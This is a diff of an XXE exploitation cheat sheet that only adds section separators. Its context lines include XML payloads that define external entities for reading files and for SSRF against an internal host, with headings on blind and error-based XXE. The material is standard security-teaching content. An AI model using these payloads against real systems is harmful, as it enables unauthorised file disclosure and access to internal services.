@@ -20,6 +20,8 @@ description: "Learn to detect and exploit XXE (XML External Entity) vulnerabilit
 
 {{< /details >}}
 
+---
+
 ## Retrieve files
 
 1. Introduce (or edit) a `DOCTYPE` element defining an external entity with the file path.
@@ -46,6 +48,8 @@ description: "Learn to detect and exploit XXE (XML External Entity) vulnerabilit
 <stockCheck><productId>&xxe;</productId></stockCheck>
 ```
 
+---
+
 ## Perform SSRF attacks
 
 ```xml
@@ -53,6 +57,8 @@ description: "Learn to detect and exploit XXE (XML External Entity) vulnerabilit
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
 <stockCheck><productId>1&xxe;</productId><storeId>1</storeId></stockCheck>
 ```
+
+---
 
 ## Blind XXE
 
@@ -105,6 +111,8 @@ Trigger an XML parsing error message with the file contents.
 {{< hint style=notes >}}
 **Note**: This works if you notice an error in the response when detecting with OAST (e.g., the reflected URL entered).
 {{< /hint >}}
+
+---
 
 ## Hidden attack surface
 
